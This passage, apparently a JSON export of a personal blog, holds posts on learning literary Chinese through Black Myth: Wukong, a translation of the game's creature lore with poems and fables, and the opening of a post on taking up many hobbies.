{"meta":{"title":"Tack, Hunt, Pool","subtitle":null,"description":"Where I keep all the stuff that doesn't fit in my head","author":"Ray Wang","url":"http://raywang.tech","root":"/"},"pages":[{"title":"Categories","date":"2017-03-10T08:56:35.000Z","updated":"2024-08-29T06:03:14.441Z","comments":true,"path":"categories/index.html","permalink":"http://raywang.tech/categories/index.html","excerpt":"","text":""},{"title":"About Me","date":"2017-03-09T12:34:05.000Z","updated":"2024-08-29T06:03:14.441Z","comments":true,"path":"about/index.html","permalink":"http://raywang.tech/about/index.html","excerpt":"","text":"I currently work for Apple CoreOS and studied computer science at MIT, where I co-started the MIT security club and CTF team, TechSec. This humble blog is mostly a reference for my forgetful future self. I’ll be posting CTF writeups, projects I’m working on, things I think are worth sharing, and some other personal bric-a-brac. I hope that other curious netizens may glean something useful from my blog as well. – 1/24/19 Get in touch with me at gh0stlygr4y@gmail.com! Home page photo from MIT Image Library"},{"title":"Tags","date":"2017-03-10T08:37:46.000Z","updated":"2024-08-29T06:03:14.463Z","comments":true,"path":"tags/index.html","permalink":"http://raywang.tech/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Learning to Read Chinese Classic Literary Fiction","slug":"Some-Notes-on-Reading-Chinese-Literary-Fiction","date":"2024-10-04T07:00:00.000Z","updated":"2024-10-07T23:11:46.962Z","comments":true,"path":"2024/10/04/Some-Notes-on-Reading-Chinese-Literary-Fiction/","permalink":"http://raywang.tech/2024/10/04/Some-Notes-on-Reading-Chinese-Literary-Fiction/","excerpt":"As part of my obsession with the seminal Chinese blockbuster game Black Myth: Wukong, I've spent countless hours studying Chinese literature, language, and culture to better appreciate the rich lore and context of the story. This post serves as a record of my learning process, as well as a guide for other novice language learners seeking to immerse themselves in the refined beauty of Chinese literature.","text":"As part of my obsession with the seminal Chinese blockbuster game Black Myth: Wukong, I’ve spent countless hours studying Chinese literature, language, and culture to better appreciate the rich lore and context of the story. The heart of Black Myth: Wukong is a continuation of the fantastical events of Journey to the West, one of the most influential works of literature in world history. The game, which has already sold over 20 million copies since its August release, is equal parts a passion project from the developers and a groundbreaking for China in the AAA game industry. It’s hard to overstate what this means for Chinese people, all of whom grew up on these legends, yet have never before experienced a game so dedicated to them. Since the first trailer was released over four years ago, I’ve gone on a journey of my own, in the hopes of being able to appreciate the entire game in Chinese. I knew this would be no small undertaking, given the fact that the source text, as well as the game, are in a combination of literary prose and classic poetry (think Shakespeare × the King James Bible). Furthermore, I began from the reading comprehension and character recognition of an elementary schooler, since I barely studied or used the language growing up. Thus, I’ve found it immensely challenging, yet rewarding, to return to my roots and develop the skills necessary to achieve this goal. This post serves as a record of my learning process, as well as a guide for other novice language learners seeking to immerse themselves in the refined beauty of Chinese literature. Classical vs Vernacular Chinese It’s often described that there are two forms of written Chinese: Classical, or Literary, Chinese (文言文), and a Vernacular Chinese (白话文). Classical is a highly concise but now-obsolete style that was used for thousands of years in all formal contexts. Vernacular, which is in present use, gained traction in the early modern period via novels meant for the general public. Journey to the West, published in 1592 by Wu Cheng-En, is considered one of those novels. However, I’d characterize it more as a blend of the two versions. The prose, while more parseable than Classical Chinese, maintains a scholarly and courtly tone that draws heavily on Classical language. This makes sense, given its setting in the 7th century Tang dynasty, and its subject matter of celestial immortals, demons, and religious pilgrimage. The text also intersperses lengthy stanzas of poetry for embellishment, which naturally employ Classical structures. The result is eminently readable, yet still exquisite, elegant, and wondrously descriptive. As you might expect, BMW spares no effort in its faithfulness to the novel. All the dialogue, flavor text, and lore are written in the same half-Classical, half-Vernacular style, that I will call literary prose for the remainder of this article. So, how do we go about learning literary prose? Here’s what I did: Context, context, context Not strictly about language learning, but I believe that, to understand a work like BMW, you need to understand its context. Largely for fun as well as education, I started by rewatching the 1998 cartoon version of Journey to the West that I recalled from my childhood, while reading Anthony C. Yu’s abridged translation The Monkey and the Monk. This gave me a foothold for the story elements. Then, before even attempting the source text, I skimmed some full synopses, reduced-difficulty versions, and relevant vocab lists, familiarizing myself with common names and words. All these served to make the initial encounter with the original work less daunting. Memorizing characters and words Despite the tens of thousands of unique characters in Chinese, you might be surprised that 98% of standard modern text, such as newspapers, use only 2000 of them. But that glosses over so much — you need to know the many two-character words and four-character idioms that can be formed from that set, along with the grammatical structures. 98% character recognition sounds like a lot, but is often only enough to get the gist of every sentence, while the nuance is much harder to extract. And in Classical Chinese, the situation is even more complex. One major difference from modern Chinese is that the author will express words with just one character that has multiple meanings, rather than the unambiguous two. So, knowing a character may not even be enough — you need to know all the possible definitions, many of which have fallen out of common usage. Trying to unravel the resulting terseness can be like guesswork. Additionally, it heavily uses all sorts of strange pronouns and means of address, some of which are unclear as to who/what they’re referring to. But firstly, expanding vocabulary and character recognition is a necessary starting point. Around 2500-3000 characters is enough to largely grok the prose in BMW and Journey to the West, but the most classical/archaic bits and the poetry would require 4-5000 characters for a careful reading. I use Anki for memorization, which many learners will be familiar with. It’s a free flashcard app that uses spaced repetition, with frequency of each card adjusted based on how difficult you find it. Other language learning tools OCR A good Optical Character Recognition (OCR) tool is a must when trying to translate on-screen text in videos or photos. On desktop, DeepL works amazingly for me, allowing me to take a partial screenshot of some text and translate it via a single keyboard shortcut. To OCR mobile screenshots, Papago performs the same purpose, but in multiple steps, because you first need to take a screenshot and then upload it to the app. Both are better than Google Translate because you can select the text after the OCR detection, allowing you to copy-paste it into, say, Anki. Browser Extensions If you’re a Simplified Chinese learner like me, the New TongWenTang Chrome browser extension allows converting web pages between Simplified and Traditional. And you might already know the Zhongwen plugin, which translates words as you hover over them. Video translating On Youtube and Netflix, Language Reactor is an extension that shows the Chinese and English subtitles at the same time, while allowing you to pause after every voice line, navigate lines, and translate on hover. Common patterns Now, here’s a cheat sheet of some of the common patterns in literary prose that you might encounter on a first reading. There’s many other resources online that provide a deeper or more comprehensive study of Classical Chinese, so I’ll restrict myself to simpler forms that are commonly used in BMW and Journey to the West. Particles and adverbial phrases Word AKA Translation Notes 之 zhī 的 a possessive 与 yú 和 and, or with 此 cǐ 这 this; these See next two rows 此乃 cǐ nài 这是 this is 如此 rú cǐ 象这样 like this; like so 却说 què shuō as we were saying; now the story goes Literary particle at the beginning of a story, used to resume narration from where it was left off 则 zé instead Used to connect contrasting phrases 而 ér then; and; but Used to connect related or contrasting words 若 ruò 1. 象; 似乎 2. 如果 1. like; as if 2. if; supposing 宛若 wǎn ruò 象 to be just like 亦 yì 也 also 遂 suí 然后 then 致 zhì to cause/result in 尚 shàng still; yet 至 zhì 到 to; until Ex. 至今 (until now) 所 suǒ that which is Ex. 所吃的 (that which is eaten) Questions/Rhetoricals Word AKA Translation Notes 奈 nài how; why Expresses frustration and futility. Commonly seen: 1. 无奈 (to have no alternative) 2. 奈何 (what can be done?) 岂 qǐ 怎么可能？ how? Ex. a common exclamation 岂有此理 (how can this be?; preposterous!) 何 hé why not 如何 rú hé 怎么样？ how about this/that? 不妨 bù fáng 为什么不？ why not? Particles for emphasis/embellishment Word AKA Translation Notes 矣 yǐ 了 a final particle 也 yě emphatic final particle 哉 zāi 吧 emphatic final particle Pronouns/Forms of address Ancient China had no shortage of words to refer to others or oneself, especially in self-deprecating fashion. Word AKA Translation Notes 其 qí 1. 的 1. a possessive, like his/hers/its/their 2. it (refers to something preceding) Can have many different uses, but often one of these 斯 sī 这 this 吾 wú 俺 ǎn 我 I/me 卑 bēi 愚 yú 敝 bì 我 I, the lowly/ignorant Self-deprecating 奴婢 nú bì 贱妾 jiàn qiè 我 I, your slave/servant/concubine Self-deprecating (for women) 汝 rǔ 你 you/thou 朕 zhèn 我 I/me Used by an emperor for self-address 贤 xián worthy or virtuous person Used to refer to someone respected 好汉 háo hàn great man Used to refer to a strong/courageous person 千夫 qiān fū 群众 a lot of people; the masses 百姓 bǎi xìng 群众 the common people; the masses Negation/affirmation expressions There are tons of words used to express negative and positive meanings in Chinese. Sometimes, as in English, they can even express the opposite connotation (think double negatives). Here’s some common negatives and their usages. Word Translation Notes 非 fēi 未 wèi 无 wú 毋 wú 弗 fú not; non- 莫 mò 勿 wù do not 切莫 (you must not) 否 fǒu to negate Ex. 是否 (if; whether or not) 免 miǎn to avoid Ex. 难免 (hard to avoid) Descriptors for time Time of day You should be at least familiar with the primary systems for telling time in historical China, which are heavily rooted in Chinese cosmology, mythology, and astrology. Simply put, there are two sets of ordinals (counting symbols like 1, 2, 3, etc) that are used for both counting and timekeeping: the Ten Heavenly Stems and Twelve Earthly Branches. The Twelve Earthly Branches were used to divide the 24-hour day into 2-hour increments. If you’re familiar with the Chinese Zodiac, there’s some association as well — each of the 12 zodiac animals has a corresponding Earthly Branch.[1] You don’t really need to know all the Earthly Branches, but I’ve included some of the most important ones in the table. A few, such as 午 (中午,下午) and 晨 (早晨) are still in common use today. Word Translation Notes 卯 mǎo dawn 4th Earthly Branch, 6am 晨 chén early morning 5th Earthly Branch, 8am. Ex. 拂晨 (daybreak) 午 wǔ noon 7th Earthly Branch, 12pm 旦 dàn 晓 xiǎo dawn Ex. 拂晓 (daybreak) 夕 xī dusk 昼 zhòu daytime 昏 hūn twilight Ex. 黄昏 (dusk) 暮 mù sunset 傍晚 bàng wǎn near nightfall Chronology and timespan There are many literary ways of ordering events chronologically, expressing how much time has passed, or connoting the pace of events, like suddenly or slowly.[2] Word AKA Translation Notes 昔 xī 以前 in the past Ex. 昔日, 昔年 (in times past; once upon a time) 翌日 yì rì 明天 tomorrow 曾 céng 以前 once; formerly Ex. 曾经 载 zǎi 年 a year Ex. 半载 (half a year) 晌 shǎng 天 a day Ex. 半晌 (quite a while; lit. half a day) 倏地 shù de 霍 huò 骤然 zhòu rán 乍 zhà 蓦然 mò rán 突然 suddenly 顿时 dùn shí immediately 霎时间 shà shí jiān 须臾 xū yú in a split second; in a flash 顷刻 qǐng kè 没过多久 in no time; right away 之际 zhī jì 的时候 during; at the time of Counting The first few of the Ten Heavenly Stems are still in modern usage as counting ordinals, especially in scientific settings, where they can function like the Greek alphabet’s alpha, beta, gamma, etc. Other words in this table may express repetition or multiplicity. Word AKA Translation Notes 甲 jiǎ 第一 first 1st Heavenly Stem 乙 yǐ 第二 second 2nd Heavenly Stem 丙 bǐng 第三 third 3rd Heavenly Stem 丁 dīng 第四 fourth 4th Heavenly Stem 屡 lǚ repeatedly 一番 yī fān once 兼 jiān double; twice; dual Ex. 兼备 (have both of two things) Religion Journey to the West is a fantasy retelling of a real-life pilgrimage to India by the Buddhist monk Tang Sanzang to retrieve sacred Buddhist scriptures. Thus, the text is rife with religious vocabulary. Word Translation Notes 施主 shī zhǔ benefactor Used by a monk to address a layperson 老衲 lǎo nà I Form of deprecating self-reference for an old monk 修行 xiū xíng to practice Buddhism A general word to describe the overall practice of spiritual development, such as meditation and asceticism 投胎 tóu tāi reincarnation 轮回 lún huí reincarnation 涅槃 niè pán nirvana 报应 bào yìng karma 因果 yīn guǒ karma; cause and effect 苦海 kǔ hǎi abyss of worldly suffering 浮屠 fú tú stupa - a Buddhist temple 刹 chà Buddhist monastery Death Ways for embellishing or euphemizing death are common in any culture. Chinese is no exception; another student has collected 60 such words, and that isn’t even close to complete. I add some other important ones in the table below. Word Translation Notes 暴毙 bào bì to die suddenly 成仁 chéng rén to die for a good cause 舍身 shě shēn 牺牲 xī shēng to sacrifice oneself 驾崩 jià bēng (of an emperor) to pass away 下地狱 xià dì yù to descend to hell 见阎王 jiàn yán wáng to see the King of Hell Misc Verbs/Adjectives These are other random words that I think you should know. Word AKA Translation Notes 料 liáo 预料 anticipate; expect Ex. 未料 (unexpectedly) 晓 xiǎo 知道 know 甘 gān 愿意 willing 照例 zhào lì 按正常 as usual; usually Hope this has been helpful! $(\"tr > td:nth-of-type(1)\").each(function(i) { $(this).css(\"white-space\", \"nowrap\"); }); $(\"tr > td:nth-of-type(2)\").each(function(i) { $(this).css(\"white-space\", \"nowrap\"); }); 1.Aside: The twelve branches were also used by sailors to divide the 360 degrees and indicate compass direction ↩2.Why are there so many words for suddenly? ↩","categories":[{"name":"Linguistics","slug":"Linguistics","permalink":"http://raywang.tech/categories/Linguistics/"}],"tags":[{"name":"Chinese","slug":"Chinese","permalink":"http://raywang.tech/tags/Chinese/"},{"name":"Black Myth Wukong","slug":"Black-Myth-Wukong","permalink":"http://raywang.tech/tags/Black-Myth-Wukong/"},{"name":"SF/Fantasy","slug":"SF-Fantasy","permalink":"http://raywang.tech/tags/SF-Fantasy/"},{"name":"Journey to the West","slug":"Journey-to-the-West","permalink":"http://raywang.tech/tags/Journey-to-the-West/"}]},{"title":"A Translation of Black Myth: Wukong — Compendium of Creatures","slug":"A-Translation-of-Black-Myth-Wukong-Lore-—-Compendium-of-Creatures","date":"2024-03-23T07:00:00.000Z","updated":"2024-10-05T05:27:25.247Z","comments":true,"path":"2024/03/23/A-Translation-of-Black-Myth-Wukong-Lore-—-Compendium-of-Creatures/","permalink":"http://raywang.tech/2024/03/23/A-Translation-of-Black-Myth-Wukong-Lore-%E2%80%94-Compendium-of-Creatures/","excerpt":"The most hyped videogame release of this year might just be Black Myth: Wukong, a Chinese action RPG set in the fantasy world of Journey to the West. To improve my Chinese and be able to fully immerse myself in the game on release, I've been consuming anything I can find about it online. During public demos last year, players screen-captured a lore book called yǐng shén tú (影神图), an illustrated compendium of supernatural enemies encountered in one of the game's regions, Purple Cloud Mountain (紫云山). Here, I've translated the available compendium entries from the original blog post, with some help from ChatGPT.","text":"The most hyped videogame release of this year might just be Game Science’s Black Myth: Wukong. It’s set in the fantasy world of Journey to the West, a classic Chinese tale of a monk and his band of heroes on an epic gods-and-demons pilgrimage westward to retrieve sacred Buddhist texts. Published in 1592, the revered novel is still massively influential and perhaps the most famous Asian literary work of all time. In the game, you’ll play as a likeness of Sun Wukong, the hero known as the Monkey King, as you fight wondrous monsters in extraordinary settings plucked straight from the pages of the legendary mythos. This Souls-like action RPG, coming to all platforms in August, is one of the few flagpoles for Chinese culture and representation in the prestige game industry. To improve my Chinese and be able to fully immerse myself in Black Myth: Wukong on release, I’ve been consuming anything I can find about the game online. During public demos last year, players screen-captured a lore book in the game called yǐng shén tú (影神图), an illustrated compendium of supernatural enemies encountered in one of the game’s regions, Purple Cloud Mountain (紫云山). Each entry is accompanied by a painting, a poem, and a short folktale or fable. Here, I’ve translated the available compendium entries from the original blog post, with some help from ChatGPT. It seems that, in this travelogue, some benefactor has recorded the likenesses, names, and stories of the various characters and creatures encountered by the Destined One during his journey. Small monsters The toad demon (小呱呱) Making trouble with staring eyes Making noise with ringing ears Filthy bodies and stinking flesh Bursting apart at the perish Once upon a time, there lived in a swamp two toads, both devoutly cultivating virtue[1]. The small toad was often bullied, but the large toad always stood up for him, so rather quickly, they became friends. One day, Wave in the Storm (波里个浪?) decided to select a pair from among the toads to become his demon officers, and of course everyone wanted to be chosen. With the large toad’s strength and the small toad’s cunning, they were shoo-ins to be the final candidates. The other toads were indignant to a one, but no one dared protest. Then one day, while the two toads were guarding their master’s dwelling, one of his amber cups broke out of the blue, with no immediate culprit. Yet all the toads went up in arms, clamoring for the pairs’ heads. The large toad argued back, rising to blows, while the crowd claimed he was lashing out from embarrassment, further evidence of his guilt. Meanwhile, the small toad stood to the side without a word. The large toad was dismayed the smaller wasn’t defending himself, which quickly turned to suspicion. After hesitating a moment, the small toad admitted that it was indeed he who broke the cup. However, the other demons didn’t buy it, claiming that both should still be punished — one for recklessness, the other for neglect. The small toad became more and more anxious as he listened, till he couldn’t bear it any longer and joined the squabble. The throng argued louder and louder, their bellies swelling bigger and bigger, until all of a sudden, several of them burst straight open! Blood and flesh splattered over the whole gathering — and in the end, not a single toad came out unscathed. The dragonfly demon (蜻蜓精) Through the trees fly silent arrows, Beating wings riding evil winds It’s hard to reach virtue merely through good deeds and cleverness, When so many obstacles block the Way There once was a dragonfly goblin who loved archery. When his mother found out about her son’s talent, she pulled some strings and had him sent to the Monster King for formal training. The Monster King soon found that the dragonfly was an exceptional disciple. Besides working hard day in and day out, the dragonfly was exceedingly respectful and attentive to his master, heeding his every beck and call. Even when the dragonfly was practicing well outside the palace, the king would open his mouth and he would appear at his service immediately! This raised some questions, but the king reasoned the dragonfly must have very nimble wings, and he didn’t inquire further. One day, the Monster King was giving a lesson on how to store up more mystical energy in one’s arrows, exhorting, “Draw the bow until the arrowhead glows brightly, then fire precisely at that moment.” The dragonfly eagerly gave his assent, but when the king quizzed him that afternoon, he was totally clueless. He must have failed to learn the lesson, the king thought, and carefully repeated his teachings. But the next day, the dragonfly was again utterly ignorant. This began to happen more and more frequently, until the king boiled over and resolved to punish his disciple. The dragonfly, now terrified, dropped to his knees, beseeching “Please calm down master! In truth, I have a few twin brothers, and we often take turns studying so that we all learn a little. So you see, that’s why we don’t always remember your lessons!” As soon as he said this, a dozen-odd dragonfly spirits rushed forth, each one a perfect copy of the others, throwing themselves to the ground and kowtowing ceaselessly. The Monster King didn’t know whether to laugh or cry. Henceforth, he bade them all be relegated to patrolling the mountain, never again teaching them any of the prized arts. Ah, a little cleverness might pay off at first, earning one praise and favor, but it conceals a hidden danger — when exposed, it invites not just mockery, but also trouble. The timeless verdure (青冉冉) In the deep forest, the timeless verdure thrives, Unsoiled by worldly dust. The web of branches are ever intertwined, Resolute as stone in pursuit of the Way Once upon a time, there was a son of a wealthy family who deserted his home in search of the immortal Way, retreating into the mountains to devote himself to the spiritual teachings. Because he had been waited on hand and foot since birth, he had no domestic skills, and he suffered greatly under this solitary existence. One day, the river carried away the wooden bowl he had been using to wash his clothes. As he chased it along the riverbank, howling in despair, he suddenly heard a rustling from the trees and looked up. Indeed, he saw a young, fair-featured woman, floating towards him on a tread of leaves and branches. The woman descended in front of him, and with comforting tone, said, “I am the spirit of the forest cypress. My soul was moved by your devoted ways, so allow me to lend you a hand.” Thus, she began to help the young man, assisting him in cooking food, cleaning and mending clothes, and other daily chores. Each time she came, she spoke little, and lingered none. But even so, the young man began to develop an affection for her. Eventually, he propositioned, &quot;Since you’re so willing to care for me, let us be partners in our spiritual journey, and live in harmony as yin and yang. The spirit flew into a rage, angrily rejecting, “Our journeys have nothing in common! Besides, I have over a thousand years of spiritual cultivation, why would I ever divulge those truths to you?” Thus spoken, she stormed off. After many tearful entreaties by the riverside, the young man eventually won her forgiveness. But not a half year later, he again brought up the same crazy idea, like a lunatic raving about utter nonsense. The woman thought for a moment, then declared, “Well, you have yet to see my true form, how could we be partners? First, come with me.” She led the man to a grove deep into the forest, whereupon he saw a colossal cypress tree, its bark thick with creases, every groove a deep ravine. The woman flew up into the treetop and disappeared. Shortly after, a great sound emanated from the old wood, as if rising from the ground itself. With a twirl of her magic, she called forth several lesser trees, each one a tangle of forks and branches, gesticulating wildly, approaching the young man to give him a lesson. The son was so terrified that he fled tail between his legs, hurriedly packing his bags and scampering towards home. The serpent apothecary (蛇司药) Hues of pine, bamboo, plum, and orchid Yet hearts akin to jackals, wolves, tigers, and leopards. Collecting herbs in remote mountains, Devoid of compassion for the world. In olden times, Purple Cloud Mountain was home to a Daoist monastery. One day, a devout and long-suffering nun arrived, weary from her distant travels, seeking lodging. The temple’s own nuns saw her road-worn state and showed great sympathy, preparing her hot water so she could clean and change clothes. While in the bath, the nun unexpectedly heard a sound coming from the rafters. Without letting on, she casually got out and draped on clothes, then picked up a fly-whisk (拂尘 fúchén) [2] and gave it a few swishes. The whisk’s hairs grew like the wind, twisting and curling, until they reached up to the ceiling and pulled down a hiding monster. Hearing the commotion, the temple’s nuns rushed in, to the sight of a green-scaled snake demon subdued on the floor. The demon wasn’t perturbed at all, as if his voyeurism were a thing of routine, while the violated nuns took turns hurling curses and insults at him. The serpent, still not repentant in the slightest, puffed his cheeks and spewed forth a thick stream of green poison, splashing it everywhere. Whoever came into contact with it immediately fell to the ground in intolerable pain. Seeing the snake goblin’s utter lack of remorse, the nun sent forth a golden needle[3], preparing to strike down the monster. At last scared, the serpent begged, “Please immortal lady, spare me, I’m just a little mountain apothecary! I have an antidote in my basket outside, if you’ll but let me live!” Sensing the demon’s sincerity, the nun decided to give him another chance. The demon produced a small white pill for her to inspect, claiming “This is a leaf of the pearl tree — very rare in the mortal realm, and able to cure a hundred ills. Have each nun take one, and they’ll immediately be healed!” Henceforth, for reasons not widely known, the temple would always have a supply of tree pearls. Victims of poisoning would travel to the monastery from across the world seeking a cure, only to find that the pearls were far too expensive for most to afford, leaving them only to await their end. The spider puppeteer (傀蛛士) Heinous noses, crooked mouths, Sharp fangs full of thick poison. Deformed ears, truncated forehead Eight eyes borne by ugly faces Once, there was a woodcutter who lived in the deep mountains. Every time he descended to take his goods to market, he would always stop to see the puppet shows, which brought him great joy and left him always longing for more. One day, he was cutting firewood in the forest when he suddenly heard the sound of cheers and whoops. Searching a bit, he came upon a crowd of monsters clustered around something, having a grand old time. Even though he was scared, the woodcutter couldn’t contain his curiosity, so he climbed a rock to survey the scene. In fact, the monsters were gathered together to watch a vaudeville act! Though he was too far to get a good look, he could make out a demon dressed all in red, brandishing two thin blades, whirling and flipping in marvelous fashion. The woodcutter couldn’t help but get closer, till he could see that the red-clothed demon actually had several legs tied behind his back, the feet hanging from threads. He quickly realized it was puppet show, and scurried up a nearby tree to get a better view. This puppet’s appearance was comically ugly, and the woodcutter thought the show was even more entertaining than the ones that old Bao put on; he was completely transfixed. Presently, he felt something cold on his neck, and reaching back, discovered it was green saliva! Looking up in alarm, he saw several beady eyes fixed on him. In reality, the tree was home to a giant lotus-colored spider, whose legs, twitching and pulling on silk threads, were in fact puppeteering the demon from afar. The woodcutter let loose a shout and tumbled out of the tree as the spider stopped the performance. The horde of demons turned towards him in quick succession, each giving him a rigid stare. The man hastily fled in terror, but fell gravely ill once he returned home. Try as he might, no medicine could help him, and before long, he succumbed to his illness. The horsetail whisk Daoist (拂尘道士)[2][4] Wide robes and a crane cloak[5], two sleeves fluttering in the wind, Why ask whether or not one knows the Way? To sing of virtues and deeds disturbs peaceful dreams The fly-whisk sweeps away dust and stirs the void At Falling Blossoms Manor, there once was a junior priest — apprenticed the latest, and in years the youngest, he thus received extra attention from the patriarch. The young priest also piously supported his revered master — when the master extended his hand, he poured tea, when he lifted his foot, he took off his shoes. Be it swatting flies, waving fans, or folding bedsheets, the priest was diligent and attentive, so the patriarch was very partial towards him. The other brothers all harbored jealousy, but they couldn’t manage to ingratiate themselves either. Instead, they resorted to verbal abuse and ostracism to vent their envy. On a certain day, the master ascended the stage, meaning to test his disciples’ learning. When the young priest’s turn came, the master deliberately gave him a softball — he asked him to recite just one passage from the Daodejing[6]. The young disciple, brimming with self-confidence, belted out by heart: “The Way — One begets One, Two begets Two, Three begets Three, all things are begot!” [7] At this long-awaited moment, the brothers all looked up, having finally gotten what they’d wished for. They started laughing nonstop, even casting furtive glances at their master to see his embarrassed reaction. Sure enough, the patriarch was utterly furious, departing with a swish of his sleeve. The brothers then descended on the young priest, sneering “You insolent boy, now you’ve angered him, don’t expect he’ll ever teach you anything again.” The master avoided his disciple for a little while, but upon seeing that he couldn’t avail himself of other second-rate helpers, he began to miss the boy’s utility. After a few days, he summoned the young priest back to assist him. Yet still, he could clearly see that the young priest’s thoughts were completely unfocused on attaining the Way, which disgusted him all over again. One day, the boy beseeched his master to teach him some Daoist abilities. In perhaps a deliberate taunt, the master offhandedly conjured up a lesson based on the boy’s fly-swatting and fan-waving, teaching him a few wind-controlling magics, and left it at that. The staff-wielding Daoist (执杖道士) The immortal mountains and clouds span the firmaments, But despite gazing to the ends of the earth, home is nowhere in sight. Wielding a staff, journeying far into perilous nests, So as to enjoy white snow and yellow buds In times past, there was a village nestled at the top of a mountain infested by pest monsters. Because the monsters would often cause trouble, the townspeople moved away one by one, until the village was entirely abandoned. In addition, at the base of the mountain, there lived a young boy, motherless and destitute, and neglected by his lazy father. All the villagers looked down on him, heaping on humiliation by the daily, till he figured he might as well flee to the abandoned village and live there instead. However, it just so happened that a bug demon had already moved into the village. So, when the youth alighted at the mountaintop, he was immediately captured by the monster. Yet he wasn’t at all concerned, since, in truth, he had already lost the will to live. When the bug demon saw this, rather than cause him any more harm, he instead settled him in one of the run-down houses. One night, a middle-aged Daoist bearing clothes and food came to the village, saying to the boy, “I’ve heard you’ve nowhere to go. I’ve brought some everyday items for you, and, if you see fit, you could accept me as your master while remaining here — I could even teach you to cultivate your innate spiritual arts.” The youth hadn’t received such care from another person in ages, so he quickly donned priests’ robes, apprenticing himself. From then on, the youth and the bug demon built a life practicing the Way together, rising to their studies as one, and resting just the same. Some time later, a scholar burst into the youth’s home, exclaiming, “I’ve just escaped from a monster’s den! They had me sealed up in a cocoon — I didn’t even know what they planned to do with me. I’m about to make a run for it — seeing as you’re another human being, I figure we can take off together!” But the youth shook his head. “I’m living quite a nice life, why would I want to leave?” The scholar angrily replied, “Because you’re surrounded by monsters, and you’re a human! Not even considering whether they might wish you harm you someday, if you spend long enough among them, you might become a freak yourself.” “You’re right,” said the boy, grabbing his staff and knocking the scholar to the ground. “But even if I were to become a monster, I’d be delighted.” Seeing the youth’s stubbornness, the scholar gritted his teeth and scurried out the door, absconding alone. 1.A religious phrase (修炼) from Daoism meaning to practice virtuous conduct and achieve spirituality, as is the way of all beings ↩2.A horsetail whisk, commonly used as an instrument by Daoists and symbolizing authority and power ↩3.金针 (jīnzhēn), an acupuncture needle, also figuratively a magical secret, trick, or key ↩4.Commentary: The Daoists are often portrayed as enemies in the original Journey to the West, perhaps due to the fact that, it was simply a competing religion to Buddhism during much of China's history ↩5.鹤氅 (hèchǎng) one of several names for a traditional Chinese robe, often worn by scholars ↩6.道德经, the foundational text of Daoism ascribed to Laozi circa 4th century BC ↩7.The disciple completely botches this fundamental passage from the Daodejing: 'The Way begets One, One begets Two, Two begets Three, and Three begets all things.' ↩","categories":[{"name":"Gaming","slug":"Gaming","permalink":"http://raywang.tech/categories/Gaming/"}],"tags":[{"name":"Chinese","slug":"Chinese","permalink":"http://raywang.tech/tags/Chinese/"},{"name":"Black Myth Wukong","slug":"Black-Myth-Wukong","permalink":"http://raywang.tech/tags/Black-Myth-Wukong/"},{"name":"SF/Fantasy","slug":"SF-Fantasy","permalink":"http://raywang.tech/tags/SF-Fantasy/"},{"name":"Journey to the West","slug":"Journey-to-the-West","permalink":"http://raywang.tech/tags/Journey-to-the-West/"}]},{"title":"One Thousand and One Hobbies","slug":"One-Thousand-and-One-Hobbies","date":"2023-08-28T02:20:37.000Z","updated":"2024-10-07T09:13:17.129Z","comments":true,"path":"2023/08/27/One-Thousand-and-One-Hobbies/","permalink":"http://raywang.tech/2023/08/27/One-Thousand-and-One-Hobbies/","excerpt":"Since quarantine days, I’ve picked up a lot of hobbies. And if you know me, you know I’m not overselling myself — try surfing, archery, sporting clays, golf, coral reef aquarium-keeping, climbing, skateboarding, skiing, and travel for a start… Why? Full reasons unclear, but at least a combination of pure impulsiveness and a desire to challenge myself and become a more versatile person. Along the way, I’ve survived some self-discovery and learned a lot about the process of learning. This post should hopefully spark some interest in my diverse activities and provide insights on how to pick up and enjoy new skills.","text":"Since quarantine days, I’ve picked up a lot of hobbies. And if you know me, you know I’m not overselling myself — try surfing, archery, sporting clays, golf, coral reef aquarium-keeping, climbing, skateboarding, skiing, and travel for a start… Why? Full reasons unclear, but at least a combination of pure impulsiveness and a desire to challenge myself and become a more versatile person. Along the way, I’ve survived some self-discovery and learned a lot about the process of learning. This post should hopefully spark some interest in my diverse activities and provide insights on how to pick up and enjoy new skills. Thoughts on hobby-hopping and the thrill of learning While most people do hobbies primarily for fun, I’ve found that I’m instead drawn to the challenge of learning a unique skill. I’ve seen comparisons made between hobby-hopping and ADD, and I think there’s something to be said about that. What both behaviors have in common is that they’re motivated by a thrill for novelty and difficulty; satisfaction only comes from variety. For me, hobby-hopping is not so much trouble focusing on one activity as an impulsion to prove that I can learn everything if I try hard enough. I’ll fixate on a hobby until I feel like I’ve reached a baseline level of competence, at which point I’ll rotate it out until the desire to improve hits again. This also means I judge myself by how quickly I’m learning, as well as how continually I’m improving. And what improvement boils down to is problem solving. Here’s some examples of problem-solving challenges that new hobbies might pose: How to refine and repeat a precise technique (swinging a golf club) How to complete a large project efficiently (building furniture, memorizing a lengthy piano piece) How to apply techniques and abilities to novel scenarios (solving a climbing route) How to maintain a system and remedy issues (aquarium-keeping, gardening) Of course, many hobbies involve a combination of these challenges — technique is often dependent on physical ability, efficiency dependent on technique, etc. And it’s not to say many other hobbies I also enjoy, like watching movies or reading books, don’t require some skills. But learning general approaches to the above categories will make all manner of activity accessible, no matter how distinctive or difficult. In the next few sections, I’ll share some insights into improvement in the face of a tough learning curve. Perfecting technique When it comes to skills that are judged by their technique, I find that it’s a lot like debugging software! In the same way that you search for the solution to a tricky bug, you’re trying to find what’s wrong with your technique that might be hampering your consistency, accuracy, power, or efficiency. Get lots of perspectives. The obvious ones are getting coaching, or recording yourself and comparing against what the pros do. But also, spitballing with and studying other amateurs, like your friends, occasionally leads to further insights. Even teaching someone is a way to test how deep your understanding of proper technique goes. Figure out how to reconcile conflicting information. With all the instruction you’ll get, you’ll realize some of it may be contradictory. You have to reconcile conflicting advice and winnow out the stuff that doesn’t suit you. However, there are always fundamental mechanics that you can’t get away with ignoring, so focus on identifying those first. Take notes on things you’ve tried. IT people call this an “audit trail”. Sometimes, the path to proper technique is a winding one. You need to remember what worked and what didn’t, which ultimately helps narrow down the search space. You might also make connections between past attempts that could be synthesized into new approaches. Aside: if you’ve ever read Debugging: The 9 Indispensable Rules, then you’ll recognize how similar some of the previous tips are! Breaking down projects It can be daunting to start a hobby that might take months and months to achieve a worthwhile result. To avoid getting discouraged, what I’ve found helps is to always keep the end goal in mind. For instance, while learning a 30-page piano piece, I’ll add multiple recordings of it to my shuffle playlist. Being reminded of what inspired you (in my case, the glorious symphony of Rhapsody in Blue from Fantasia), as well as the satisfaction you’ll get at the end, will keep you pushing onward. Identify patterns between sections of your project as you deconstruct 